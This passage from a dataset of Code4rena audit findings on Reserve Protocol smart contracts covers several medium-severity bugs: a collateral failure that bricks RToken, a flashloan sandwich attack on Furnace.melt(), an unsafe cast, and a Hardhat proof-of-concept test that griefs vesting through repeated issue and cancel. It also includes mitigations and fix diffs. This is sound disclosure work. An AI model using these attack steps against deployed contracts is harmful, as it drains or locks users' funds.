      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/234",
      "tags": [],
      "finders": [
        "0xA5DF"
      ]
    },
    {
      "id": "16026",
      "title": "[M-16] RToken permanently insolvent/unusable if a single collateral in the basket behaves unexpectedly",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L45><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L37><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L50><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L300><br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L87>\n\nAsset plugins assume underlying collateral tokens will always behave as they are expected at the time of the plugin creation. This assumption can be incorrect because of multiple reasons such as upgrades/rug pulls/hacks.\n\nIn case a single collateral token in a basket of assets causes functions in the asset to fail the whole RToken functionality will be broken.\n\nThis includes (and not limited to):\n\n1.  Users cannot redeem RTokens for any collateral\n2.  Users cannot issue RTokens\n3.  Bad collateral token cannot be unregistered\n4.  Stakers will not be able to unstake\n5.  Recollateralization will not be possible\n6.  Basket cannot be updated\n\nThe impacts become permanent as the unregistering of bad collateral assets is also dependent on collateral token behavior.\n\nEmphasis of funds lost:<br>\n* A basket holds 2 collateral assets \\[cAssetA, cAssetB] where cAssetA holds 1% of the RToken collateral and cAssetB holds 99%.\n* cAssetA gets hacked and self-destructed. This means it will revert on any interaction with it.\n* Even though 99% of funds still exists in cAssetB. They will be permanently locked and RToken will be unusable.\n\n### Proof of Concept\n\nLets assume a `CTokenFiatCollateral` of `cUSDP` is registered as an asset in `AssetRegistry`.\n\nOne day, `cUSDP` deployer gets hacked and the contract self-destructs, therefore any call to the `cUSDP` contract will fail.<br>\n`cUSDP` is a proxy contract:<br>\n<https://etherscan.io/address/0x041171993284df560249B57358F931D9eB7b925D#readProxyContract>\n\nNote: There could be other reasons that calls to `cUSDP` will revert such as:\n\n1.  Upgrade to implementation to change/deprecate functions\n2.  Freezing of contract for a long duration of time (due to patching)\n3.  blacklisting/whitelisitng callers.\n\n**Bad collateral assets cannot be unregistered**\n\nLets describe the flow of unregistering an asset from the `AssetRegistry`:\n\n`governance` needs to call `unregister` in order to unregister and asset:<br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L87>\n\n        function unregister(IAsset asset) external governance {\n            require(_erc20s.contains(address(asset.erc20())), \"no asset to unregister\");\n            require(assets[asset.erc20()] == asset, \"asset not found\");\n            uint192 quantity = basketHandler.quantity(asset.erc20());\n\n            _erc20s.remove(address(asset.erc20()));\n            assets[asset.erc20()] = IAsset(address(0));\n            emit AssetUnregistered(asset.erc20(), asset);\n\n            if (quantity > 0) basketHandler.disableBasket();\n        }\n\nAs can seen above, `basketHandler.quantity(asset.erc20());` is called as part of the unregister flow.\n\n`quantity` function in `basketHandler`:<br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L300>\n\n        function quantity(IERC20 erc20) public view returns (uint192) {\n            try assetRegistry.toColl(erc20) returns (ICollateral coll) {\n                if (coll.status() == CollateralStatus.DISABLED) return FIX_ZERO;\n\n                uint192 refPerTok = coll.refPerTok(); // {ref/tok}\n                if (refPerTok > 0) {\n                    // {tok/BU} = {ref/BU} / {ref/tok}\n                    return basket.refAmts[erc20].div(refPerTok, CEIL);\n                } else {\n                    return FIX_MAX;\n                }\n            } catch {\n                return FIX_ZERO;\n            }\n        }\n\nThe asset is still registered so the `try` call will succeed and ` coll.refPerTok(); ` will be called.\n\n`refPerTok` function in `CTokenFiatCollateral` (which is used as an asset of `cUSDP`):<br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L45>\n\n        function refPerTok() public view override returns (uint192) {\n            uint256 rate = ICToken(address(erc20)).exchangeRateStored();\n            int8 shiftLeft = 8 - int8(referenceERC20Decimals) - 18;\n            return shiftl_toFix(rate, shiftLeft);\n        }\n\nIf `ICToken(address(erc20)).exchangeRateStored();` will revert because of the previously defined reasons (hack, upgrade, etc..), the whole `unregister` call will be a reverted.\n\n**Explanation of Impact**\n\nAs long as the asset is registered and cannot be removed (explained above), many function calls will revert and cause the impacts in the `impact` section.\n\nThe main reason is the `refresh` function of `CTokenFiatCollateral` (used for `cUSDP`) depends on a call to `cUSDP` `exchangeRateCurrent` function.<br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/CTokenFiatCollateral.sol#L37>\n\n        function refresh() public virtual override {\n            // == Refresh ==\n            // Update the Compound Protocol\n            ICToken(address(erc20)).exchangeRateCurrent();\n\n            // Intentional and correct for the super call to be last!\n            super.refresh(); // already handles all necessary default checks\n        }\n\n`AssetRegistry`s `refresh` function calls refresh to all registered assets:<br>\n<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/AssetRegistry.sol#L50>\n\n        function refresh() public {\n            // It's a waste of gas to require notPausedOrFrozen because assets can be updated directly\n            uint256 length = _erc20s.length();\n            for (uint256 i = 0; i < length; ++i) {\n                assets[IERC20(_erc20s.at(i))].refresh();\n            }\n        }\n\nIn our case, `CTokenFiatCollateral.refresh()` will revert therefore the call to `AssetRegistry.refresh()` will revert.\n\n`AssetRegistry.refresh()` is called in critical functions that will revert:\n\n1.  `_manageTokens` - used manage backing policy, handout excess assets and perform recollateralization\n(<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L107>)\n\n2.  `refreshBucket` - used to switch the basket configuration\n(<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L184>)\n\n3.  `issue` - used to issue RTokens to depositors\n(<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L194>)\n\n4.  `vest` - used to vest issuance of an account\n(<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L380>)\n\n5.  `redeem` - used to redeem collateral assets for RTokens\n(<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L443>)\n\n6.  `poke` - in main, used as a refresher\n(<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Main.sol#L45>)\n\n7.  `withdraw` in RSR, stakers will not be able to unstake\n(<https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L302>)\n\n### Tools Used\n\nFoundry, VS Code\n\n### Recommended Mitigation Steps\n\nFor plugins to function as intended there has to be a dependency on protocol specific function.\n\nIn a case that the collateral token is corrupted, the governance should be able to replace to corrupted token. The unregistering flow should never be depended on the token functionality.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/254#issuecomment-1400504728):**\n > Downgrading to Medium and leaving open to sponsor review. There are externalities here that do no qualify the issue as High.\n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/254#issuecomment-1404418850):**\n > Nice find!\n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR makes the AssetRegistry more resilient to bad collateral during asset unregistration, and disables staking when frozen.<br>\n> [reserve-protocol/protocol#623](https://github.com/reserve-protocol/protocol/pull/623)\n\n**Status:** Not fully mitigated. Full details in [report from AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73), and also included in Mitigation Review section below.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the potential impacts of a single collateral token in a basket of assets causing functions in the asset to fail, thus rendering the whole RToken functionality broken. The impacts include users not being able to redeem RTokens, issue RTokens, unregister bad collateral assets, unstake, recollateralize, and update the basket.\n\nThe proof of concept involves a CTokenFiatCollateral of cUSDP being registered as an asset in AssetRegistry. If the cUSDP deployer gets hacked and the contract self-destructs, any call to the cUSDP contract will fail. The unregistering flow will also fail as it will call the quantity function in BasketHandler, which in turn calls the refPerTok function in CTokenFiatCollateral, which depends on a call to cUSDP's exchangeRateCurrent function.\n\nThe AssetRegistry's refresh function calls refresh to all registered assets, which will fail in this case. This will cause many functions to revert, including those used to manage backing policy, handout excess assets, perform recollateralization, switch the basket configuration, issue RTokens, vest issuance of an account, redeem collateral assets for RTokens, and withdraw.\n\nThe recommended mitigation steps involve the governance being able to replace the corrupted token and unregistering flow not being dependent on the token functionality.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/254",
      "tags": [],
      "finders": [
        "__141345__",
        "severity",
        "0xdeadbeef0x"
      ]
    },
    {
      "id": "16025",
      "title": "[M-15] The Furnace#melt() is vulnerable to sandwich attacks",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L70-L84\n\n\n## Vulnerability details\n\n\n## Impact\n\nMalicious users can get more of the RToken appreciation benefit brought by [`Furnace.sol#melt()`](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L70), and long-term RToken holders will get less benefit.\nRToken holders will be less willing to provide liquidity to RToken pools (such as uniswap pools), resulting in less liquidity of RToken.\n\n## Proof of Concept\n\n### A1. Gain revenue from a flashloan sandwich attack\n\nA malicious user can launch a flashloan sandwich attack against [Furnace#melt()](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L70) each time a whole period passed (payout happens).\n\nThe attack transaction execution steps:\n1. Borrow some assets (`inputFund`) with a flashloan\n2. Swap the `inputFund` for RToken\n3. Call [RToken#redeem()](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439) to change the RToken to basket assets(`outputFund`). The `redeem()` will invoke `Furnace.melt()` automatically.\n4. Swap part of `outputFund` for `inputFund` and pay back the flashloan, the rest of `outputFund` is the profit.\n\nThe implicit assumption here is that most of the time the prices of RToken in `RToken.issues()`, `RToken.redeem()`, and DeFi pools are almost equal.\nThis assumption is reasonable because if there are price differentials, they can be balanced by arbitrage.\n\nThe attack can be profitable for:\n* `Furnace#melt()` will increase the price of RToken in issue/redeem (according to basket rate).\n* Step 2 buys RTokens at a lower price, and then step 3 sells RTokens at a higher price(`melt()` is called first in `redeem()`).\n\n### A2. Get a higher yield by holding RToken for a short period of time\n\nMalicious users can get higher yield by by following these steps:\n1. Calculate [the next payout block](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L71) of Furnace in advance\n2. Call [RToken#issue()](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L177) 1 to n blocks before the payout block\n3. Call [RToken#redeem()](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L439) when the payout block reaches.\n\nSince this approach only requires 1 to n blocks to issue in advance, which is typically much smaller than [rewardPeriod](https://github.com/reserve-protocol/protocol/blob/df7ecadc2b/docs/system-design.md#rewardperiod), the attacker will obtain much higher APR than long-term RToken holders.\n\n## Tools Used\n\nManual\n\n## Recommended Mitigation Steps\n\nReferring to [eip-4626](https://eips.ethereum.org/EIPS/eip-4626), distribute rewards based on time weighted shares.\n\nAlternatively, always use a very small rewardPeriod and rewardRatio, and lower the upper limit [MAX_RATIO and MAX_PERIOD](https://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Furnace.sol#L15-L16).",
      "summary": "\nA bug has been identified in the Reserve Protocol, where malicious users can take advantage of the RToken appreciation benefit brought by the Furnace.sol#melt() function. The attack can be done either through a flashloan sandwich attack or by holding RToken for a short period of time. This bug affects long-term RToken holders, as they will receive less benefit, and will be less willing to provide liquidity to RToken pools, leading to less liquidity of RToken. The bug was identified using manual tools. To mitigate this bug, it is recommended to distribute rewards based on time-weighted shares or to always use a very small rewardPeriod and rewardRatio, and lower the upper limit MAX_RATIO and MAX_PERIOD.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/258",
      "tags": [],
      "finders": [
        "wait"
      ]
    },
    {
      "id": "16024",
      "title": "[M-14] Unsafe cast of uint8 datatype to int8",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BackingManager.sol#L228\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/BasketHandler.sol#L421\n\n\n## Vulnerability details\n\n## Impact\nConverting uint8 to int8 can have unexpected consequences when done unsafely. This issue affects the quote function in BasketHandler.sol and handoutExcessAssets in BackingManager.sol. While there is some risk here, the issue is unlikely to be exploited as ERC-20 tokens generally don't have a decimals value over 18, nevertheless one over 127. \n\n## Proof of Concept\n\n➜ int8(uint8(127))\nType: int\n├ Hex: 0x7f\n└ Decimal: 127\n➜ int8(uint8(128))\nType: int\n├ Hex: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff80\n└ Decimal: -128\n\n## Tools Used\nChisel\n\n## Recommended Mitigation Steps\nValidate that the decimals value is within an acceptable upper-bound before attempting to cast it to a signed integer.",
      "summary": "\nThis bug report is about a vulnerability in the quote function in BasketHandler.sol and handoutExcessAssets in BackingManager.sol. Converting from uint8 to int8 can have unexpected consequences when done unsafely, as the Proof of Concept demonstrates. If the decimals value is over 127, it will be converted to -128. Chisel was used to find this vulnerability. To mitigate the risk, it is recommended that a check is done to make sure the decimals value is within an acceptable upper-bound before attempting to cast it to a signed integer.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/265",
      "tags": [],
      "finders": [
        "0xTaylor"
      ]
    },
    {
      "id": "16023",
      "title": "[M-13] Attacker can prevent vesting for a very long time",
      "impact": "MEDIUM",
      "content": "\nWhen a user wants to issue RTokens there is a limit of how many can be issued in the same block. This is determined in the `whenFinished` function.\n\nIt looks at how many tokens the user wants to issue and then using the `issuanceRate` it calculates which block the issuance will end up in, `allVestAt`.\n\n```javascript\nFile: RToken.sol\n\n358:        uint192 before = allVestAt; // D18{block number}\n359:        // uint192 downcast is safe: block numbers are smaller than 1e38\n360:        uint192 nowStart = uint192(FIX_ONE * (block.number - 1)); // D18{block} = D18{1} * {block}\n361:        if (nowStart > before) before = nowStart;\n\n...\n\n368:        finished = before + uint192((FIX_ONE_256 * amtRToken + (lastIssRate - 1)) / lastIssRate);\n369:        allVestAt = finished;\n```\n\nIf this is the current block and the user has no other queued issuances the issuance can be immediate otherwise it is queued to be issued after the `allVestAt` block.\n\n```javascript\nFile: RToken.sol\n\n243:        uint192 vestingEnd = whenFinished(amtRToken); // D18{block number}\n\n...\n\n251:        if (\n252:            // D18{blocks} <= D18{1} * {blocks}\n253:            vestingEnd <= FIX_ONE_256 * block.number &&\n254:            queue.left == queue.right &&\n255:            status == CollateralStatus.SOUND\n256:        ) {\n                // do immediate issuance\n            }\n\n287:        IssueItem storage curr = (queue.right < queue.items.length)\n288:            ? queue.items[queue.right]\n289:            : queue.items.push();\n290:        curr.when = vestingEnd; // queued at vestingEnd (allVestAt)\n```\n\nThen in `vestUpTo` it is checked that this is vested at a later block:\n\n```javascript\nFile: RToken.sol\n\n746:        IssueItem storage rightItem = queue.items[endId - 1];\n747:        require(rightItem.when <= FIX_ONE_256 * block.number, \"issuance not ready\");\n```\n\nIf a user decides that they do not want to do this vesting they can cancel pending items using `cancel`, which will return the deposited tokens to them.\n\nHowever this cancel does not reduce the `allVestAt` state so later issuances will still be compared to this state.\n\nHence a malicious user can issue a lot of RTokens (possibly using a flash loan) to increase `allVestAt` and then cancel their queued issuance. Since this only costs gas this can be repeated to push `allVestAt` to a very large number effectively delaying all vesting for a very long time.\n\n### Impact\n\nA malicious user can delay issuances a very long time costing only gas.\n\n### Proof of Concept\n\nPoC test in `RToken.test.ts`:\n\n```javascript\n    // based on 'Should allow the recipient to rollback minting'\n    it('large issuance and cancel griefs later issuances', async function () {\n      const issueAmount: BigNumber = bn('5000000e18') // flashloan or rich\n\n      // Provide approvals\n      const [, depositTokenAmounts] = await facade.callStatic.issue(rToken.address, issueAmount)\n      await Promise.all(\n        tokens.map((t, i) => t.connect(addr1).approve(rToken.address, depositTokenAmounts[i]))\n      )\n\n      await Promise.all(\n        tokens.map((t, i) => t.connect(addr2).approve(rToken.address, ethers.constants.MaxInt256))\n      )\n      \n      // Get initial balances\n      const initialRecipientBals = await Promise.all(tokens.map((t) => t.balanceOf(addr2.address)))\n\n      // Issue a lot of rTokens\n      await rToken.connect(addr1)['issue(address,uint256)'](addr2.address, issueAmount)\n\n      // Cancel\n      await expect(rToken.connect(addr2).cancel(1, true))\n        .to.emit(rToken, 'IssuancesCanceled')\n        .withArgs(addr2.address, 0, 1, issueAmount)\n\n      // repeat to make allVestAt very large\n      for(let j = 0; j<100 ; j++) {\n        await rToken.connect(addr2)['issue(address,uint256)'](addr2.address, issueAmount)\n\n        await expect(rToken.connect(addr2).cancel(1, true))\n          .to.emit(rToken, 'IssuancesCanceled')\n          .withArgs(addr2.address, 0, 1, issueAmount)\n      }\n\n      // Check balances returned to the recipient, addr2\n      await Promise.all(\n        tokens.map(async (t, i) => {\n          const expectedBalance = initialRecipientBals[i].add(depositTokenAmounts[i])\n          expect(await t.balanceOf(addr2.address)).to.equal(expectedBalance)\n        })\n      )\n      expect(await facadeTest.callStatic.totalAssetValue(rToken.address)).to.equal(0)\n\n      const instantIssue: BigNumber = MIN_ISSUANCE_PER_BLOCK.sub(1)\n      await Promise.all(tokens.map((t) => t.connect(addr1).approve(rToken.address, initialBal)))\n\n      // what should have been immediate issuance will be queued\n      await rToken.connect(addr1)['issue(uint256)'](instantIssue)\n\n      expect(await rToken.balanceOf(addr1.address)).to.equal(0)\n\n      const issuances = await facade.callStatic.pendingIssuances(rToken.address, addr1.address)\n      expect(issuances.length).to.eql(1)\n    })\n```\n\n### Tools Used\n\nManual auditing and hardhat\n\n### Recommended Mitigation Steps\n\n`cancel` could decrease the `allVestAt`. Even though, there's still a small possibility to grief by front running someones issuance with a large `issue`/`cancel` causing their vest to be late, but this is perhaps an acceptable risk as they can then just cancel and re-issue.\n\n**[tbrent (Reserve) confirmed via duplicate issue `#364`](https://github.com/code-423n4/2023-01-reserve-findings/issues/364#issuecomment-1405483304)**\n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR removes the non-atomic issuance mechanism and adds an issuance throttle. The redemption battery is rebranded to a redemption throttle.<br>\n> [reserve-protocol/protocol#571](https://github.com/reserve-protocol/protocol/pull/571)\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/10), [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/59), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/37).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in the \"RToken.sol\" file of the Reserve Protocol. When a user wants to issue RTokens, there is a limit of how many can be issued in the same block. This is determined in the `whenFinished` function which looks at how many tokens the user wants to issue and then using the `issuanceRate` it calculates which block the issuance will end up in, `allVestAt`. \n\nIn the `vestUpTo` function, it is checked that this is vested at a later block. However, if a user decides that they do not want to do this vesting they can cancel pending items using `cancel`, which will return the deposited tokens to them. This cancel does not reduce the `allVestAt` state so later issuances will still be compared to this state.\n\nA malicious user can exploit this by issuing a lot of RTokens (possibly using a flash loan) to increase `allVestAt` and then cancel their queued issuance. This can be repeated to push `allVestAt` to a very large number effectively delaying all vesting for a very long time. This will cost only gas and can have a major impact on later issuances.\n\nTools used for finding this vulnerability were manual auditing and Hardhat. The recommended mitigation step is that `cancel` should decrease the `allVestAt` to avoid this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/267",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "hihen",
        "immeas",
        "wait",
        "unforgiven",
        "rvierdiiev",
        "JTJabba"
      ]
    },
    {
      "id": "16022",
      "title": "[M-12] BackingManager: rsr is distributed across all rsr revenue destinations which is a loss for rsr stakers",
      "impact": "MEDIUM",
      "content": "\nThe `BackingManager.handoutExcessAssets` function sends all `rsr` that the `BackingManager` holds to the `rsrTrader` (<https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179>).\n\nThe purpose of this is that `rsr` which can be held by the `BackingManager` due to seizure from the `StRSR` contract is sent back entirely to the `StRSR` contract and not - as would happen later in the function (<https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L221-L242>) - shared across `rsrTrader` and `rTokenTrader`.\n\nThe `rsrTrader` then sends the `rsr` to the `Distributor` (<https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65>).\n\nSo far so good. However the `Distributor` does not necessarily send all of the `rsr` to the `StRSR` contract. Instead it distributes the `rsr` according to its distribution table. I.e. there can be multiple destinations each receiving a share of the `rsr` (<https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136>).\n\nIn economic terms, `rsr` that is thereby not sent to `StRSR` but to other destinations, is a transfer of funds from stakers to these destinations, i.e. a loss to stakers.\n\nStakers should only pay for recollateralization of the `RToken`, not however send revenue to `rsr` revenue destinations.\n\n### Proof of Concept\n\nAssume the following situation:\n\n*   A seizure of `rsr` from the `StRSR` contract occurred because the `RToken` was under-collateralized.\n\n*   A trade occurred which restored collateralization. However not all `rsr` was sold by the trade and was returned to the `BackingManager`.\n\nNow `BackingManager.manageTokens` is called which due to the full collateralization calls `BackingManager.handoutExcessAssets` (<https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L118>).\n\nThis sends `rsr` to the `rsrTrader` (<https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/BackingManager.sol#L173-L179>).\n\nThen the `rsr` is sent to the `Distributor` (<https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/RevenueTrader.sol#L59-L65>).\n\nThere it is distributed across all `rsr` destinations (<https://github.com/reserve-protocol/protocol/blob/b30ab2068dddf111744b8feed0dd94925e10d947/contracts/p1/Distributor.sol#L108-L136>).\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\n`rsr` should be sent from the `BackingManager` directly to `StRSR` without the need to go through `rsrTrader` and `Distributor`. Thereby it won't be sent to other `rsr` revenue destinations.\n\nFix:\n\n    diff --git a/contracts/p1/BackingManager.sol b/contracts/p1/BackingManager.sol\n    index 431e0796..eb506004 100644\n    --- a/contracts/p1/BackingManager.sol\n    +++ b/contracts/p1/BackingManager.sol\n    @@ -173,7 +173,7 @@ contract BackingManagerP1 is TradingP1, IBackingManager {\n             if (rsr.balanceOf(address(this)) > 0) {\n                 // For CEI, this is an interaction \"within our system\" even though RSR is already live\n                 IERC20Upgradeable(address(rsr)).safeTransfer(\n    -                address(rsrTrader),\n    +                address(stRSR),\n                     rsr.balanceOf(address(this))\n                 );\n             }\n\nThere is a caveat to this however:\n\nIt is possible for `rsr` to be a reward token for a collateral of the `RToken`.\n\nNeither the current implementation nor the proposed fix addresses this and instead sends the rewards to `StRSR`.\n\nIn principal, `rsr` that was rewarded should have a share that goes to the `rTokenTrader` as well as include all `rsr` revenue destinations.\n\nHowever there is no easy way to differentiate where the `rsr` came from.\n\nTherefore I think it is reasonable to send all `rsr` to `StRSR` and make it clear to developers and users that `rsr` rewards cannot be paid out to `rToken` holders.\n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/276#issuecomment-1404405069):**\n > Yep, this one is a great find. \n\n**[tbrent (Reserve) commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/276#issuecomment-1421609180):**\n > Fixed here: https://github.com/reserve-protocol/protocol/pull/584\n\n**Status:** Mitigation confirmed. Full details in reports from [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/58), [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/11), and [AkshaySrivastav](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/36).\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed concerning the 'BackingManager.handoutExcessAssets' function of the 'Reserve Protocol' on GitHub. The purpose of this function is to return any 'rsr' (reserve token) held by the 'BackingManager' to the 'StRSR' (Stable Reserve) contract, but instead, it is distributed across multiple destinations according to a distribution table. This means that funds are being transferred from stakers to these destinations, resulting in a loss to stakers. A proof of concept has been provided to illustrate the issue. To fix this, it is recommended that the 'rsr' should be sent directly to the 'StRSR' contract, and it should be made clear to developers and users that 'rsr' rewards cannot be paid out to 'rToken' holders.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "https://github.com/code-423n4/2023-01-reserve-findings/issues/276",
      "tags": [],
      "finders": [
        "HollaDieWaldfee"
      ]
    },
    {
      "id": "16021",
      "title": "[M-11] Should Accrue Before Change, Loss of Rewards in case of change of settings",
      "impact": "MEDIUM",
      "content": "\nIn `StRSR.sol`, `_payoutRewards` is used to accrue the value of rewards based on the time that has passed since `payoutLastPaid`\n\nBecause of it's dependence on `totalStakes`, `stakeRate` and time, the function is rightfully called on every `stake` and `unstake`.\n\nThere is a specific instance, in which `_payoutRewards` should also be called, which could create either an unfair reward stream or a governance attack and that's when `setRewardPeriod` and `setRewardRatio` are called.\n\nIf you imagine the ratio at which rewards are paid out as a line, then you can see that by changing `rewardRatio` and `period` you're changing it's slope.\n\nYou should then agree, that while governance can *rightfully* change those settings, it should `_payoutRewards` first, to ensure that the slope of rewards changes only for rewards to be distributed after the setting has changed.\n\n### Mitigation\n\nFunctions that change the slope or period size should accrue rewards up to that point.\n\nThis is to avoid:\n\n*   Incorrect reward distribution\n*   Change (positive or negative) of rewards from the past\n\nWithout accrual, the change will apply retroactively from `payoutLastPaid`\n\nWhich could:\n\n*   Change the period length prematurely\n*   Start a new period inadvertently\n*   Cause a gain or loss of yield to stakers\n\nInstead of starting a new period\n\n### Suggested Refactoring\n\n```solidity\nfunction setRewardPeriod(uint48 val) public governance {\n    require(val > 0 && val <= MAX_REWARD_PERIOD, \"invalid rewardPeriod\");\n    _payoutRewards(); // @audit Payout rewards for fairness\n    emit RewardPeriodSet(rewardPeriod, val);\n    rewardPeriod = val;\n    require(rewardPeriod * 2 <= unstakingDelay, \"unstakingDelay/rewardPeriod incompatible\");\n}\n\nfunction setRewardRatio(uint192 val) public governance {\n    require(val <= MAX_REWARD_RATIO, \"invalid rewardRatio\");\n    _payoutRewards(); // @audit Payout rewards for fairness\n    emit RewardRatioSet(rewardRatio, val);\n    rewardRatio = val;\n}\n```\n\n**[tbrent (Reserve) confirmed and commented](https://github.com/code-423n4/2023-01-reserve-findings/issues/287#issuecomment-1404391327):**\n > Nice finding, agree. \n\n**[tbrent (Reserve) mitigated](https://github.com/code-423n4/2023-02-reserve-mitigation-contest#mitigations-to-be-reviewed):**\n > This PR adds a `Furnace.melt()`/`StRSR.payoutRewards()` step when governance changes the `rewardRatio`: [reserve-protocol/protocol#622](https://github.com/reserve-protocol/protocol/pull/622)\n\n**Status:** Mitigation confirmed with comments. Full details in reports from [HollaDieWaldfee](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/18), [0xA5DF](https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/57), and 